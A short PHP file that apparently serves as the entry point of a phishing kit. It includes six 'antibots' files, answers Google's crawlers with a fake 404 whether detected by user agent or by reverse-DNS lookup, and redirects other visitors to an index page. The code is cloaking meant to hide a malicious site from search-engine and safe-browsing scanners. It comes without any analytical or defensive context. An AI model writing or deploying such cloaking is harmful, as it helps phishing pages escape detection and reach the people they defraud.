<?php
session_start();
error_reporting(0);
/* */
include "./antibots1.php";
include "./antibots2.php";
include "./antibots3.php";
include "./antibots4.php";
include "./antibots5.php";
include "./antibots6.php";

//----------------------------------------------------------------------------------------------------------------//
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr($_SERVER['REMOTE_ADDR']),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
//----------------------------------------------------------------------------------------------------------------//

/* */

header("location: ../index.php");
?>
